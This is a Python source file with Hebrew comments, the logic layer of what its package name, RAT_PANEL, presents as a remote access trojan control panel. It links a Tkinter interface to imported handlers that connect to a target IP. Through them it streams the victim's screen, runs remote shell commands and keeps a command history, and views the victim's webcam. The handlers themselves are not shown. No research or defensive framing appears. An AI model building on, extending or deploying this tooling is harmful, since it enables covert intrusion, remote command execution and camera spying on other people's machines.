import tkinter.messagebox
from RAT_PANEL.logic.screen_handler import ScreenHandler
from RAT_PANEL.logic.shell_handler import ShellHandler
from RAT_PANEL.logic.camera_handler import CameraHandler


class ClientLogic:
    """
    שכבת לוגיקה שמחברת בין ה-UI לבין ה-Handlers וה-Sockets.
    מנהלת IP, היסטוריית פקודות ועוד.
    """
    def __init__(self):
        self.ui = None
        self.connected_ip = None

        # היסטוריית פקודות שֶל ה-Shell
        self.history = []
        self.history_index = -1

        # Handlers (נאתחל לאחר attach_ui כי הם צריכים רפרנס ל-UI)
        self.screen = None
        self.shell = None
        self.camera = None

    def attach_ui(self, ui):
        self.ui = ui
        # יצירת handlers
        self.screen = ScreenHandler(self)
        self.shell = ShellHandler(self)
        self.camera = CameraHandler(self)

    # ========================= IP helpers ========================= #
    def remember_ip(self, ip: str):
        if not ip:
            tkinter.messagebox.showerror("Error", "Enter IP address")
            return
        self.connected_ip = ip
        tkinter.messagebox.showinfo("IP Saved", f"Server IP set to {ip}")

    def _require_ip(self) -> str | None:
        if self.connected_ip:
            return self.connected_ip
        # נסה למשוך מה-UI אם הוזן שם
        ip = self.ui.ip_entry.get().strip()
        if not ip:
            tkinter.messagebox.showerror("Error", "Enter IP address")
            return None
        self.connected_ip = ip
        return ip

    # ========================= Screen ========================= #
    def connect_screen(self):
        if self.screen.running:
            return
        ip = self._require_ip()
        if not ip:
            return
        try:
            self.screen.connect(ip)
            self.ui.screen_set_status(f"🟢 Connected to Screen ({ip})", "green")
            self.ui.screen_set_buttons(True)
        except Exception as e:
            self.ui.screen_set_status(f"❌ Screen connection error: {e}", "red")
            self.disconnect_screen()

    def disconnect_screen(self):
        self.screen.stop()
        self.ui.screen_set_status("🔌 Disconnected", "gray")
        self.ui.screen_set_buttons(False)
        self.ui.screen_clear_image("Disconnected")

    def toggle_stream(self):
        self.screen.stream_visible = not self.screen.stream_visible
        self.ui.screen_toggle_button_text(self.screen.stream_visible)
        if not self.screen.stream_visible:
            self.ui.screen_clear_image("Stream hidden")

    # ========================= Shell ========================= #
    def connect_shell(self):
        if self.shell.running:
            return
        ip = self._require_ip()
        if not ip:
            return
        try:
            self.shell.connect(ip)
            self.ui.shell_set_status(f"🟢 Connected to Shell ({ip})", "green")
            self.ui.shell_set_buttons(True)
        except Exception as e:
            self.ui.shell_set_status(f"❌ Shell connection error: {e}", "red")
            self.disconnect_shell()

    def send_command(self):
        if not self.shell.running:
            return
        cmd = self.ui.shell_get_command()
        if not cmd:
            return
        # היסטוריה
        self.history.append(cmd)
        self.history_index = len(self.history)
        self.ui.shell_clear_command_entry()
        try:
            text = self.shell.send_and_receive(cmd)
            self.ui.shell_append_output(f"$ {cmd}\n{text}\n")
        except Exception as e:
            self.ui.shell_append_output(f"[Send Error] {e}\n")
            self.disconnect_shell()

    def clear_output(self):
        self.ui.shell_clear_output()

    # Bindings למעלה/למטה
    def prev_command(self, event=None):
        if self.history and self.history_index > 0:
            self.history_index -= 1
            self.ui.shell_set_command_entry(self.history[self.history_index])

    def next_command(self, event=None):
        if self.history_index < len(self.history) - 1:
            self.history_index += 1
            self.ui.shell_set_command_entry(self.history[self.history_index])
        else:
            self.ui.shell_set_command_entry("")
            self.history_index = len(self.history)

    def run_command_enter(self, event=None):
        self.send_command()

    def disconnect_shell(self):
        self.shell.stop()
        self.ui.shell_set_status("🔌 Disconnected", "gray")
        self.ui.shell_set_buttons(False)

    # ========================= Camera ========================= #
    def connect_camera(self):
        if self.camera.running:
            return
        ip = self._require_ip()
        if not ip:
            return
        try:
            self.camera.connect(ip)
            self.ui.camera_set_status(f"🟢 Connected to Camera ({ip})", "green")
            self.ui.camera_set_buttons(True)
        except Exception as e:
            self.ui.camera_set_status(f"❌ Camera connection error: {e}", "red")
            self.disconnect_camera()

    def toggle_camera(self):
        self.camera.show_camera = not self.camera.show_camera
        self.ui.camera_toggle_button_text(self.camera.show_camera)
        if not self.camera.show_camera:
            self.ui.camera_clear_image("Camera hidden")

    def disconnect_camera(self):
        self.camera.stop()
        self.ui.camera_set_status("🔌 Disconnected", "gray")
        self.ui.camera_set_buttons(False)
        self.ui.camera_clear_image("Camera hidden")

    # ========================= lifecycle ========================= #
    def close_all(self):
        try:
            self.disconnect_screen()
        except Exception:
            pass
        try:
            self.disconnect_shell()
        except Exception:
            pass
        try:
            self.disconnect_camera()
        except Exception:
            pass
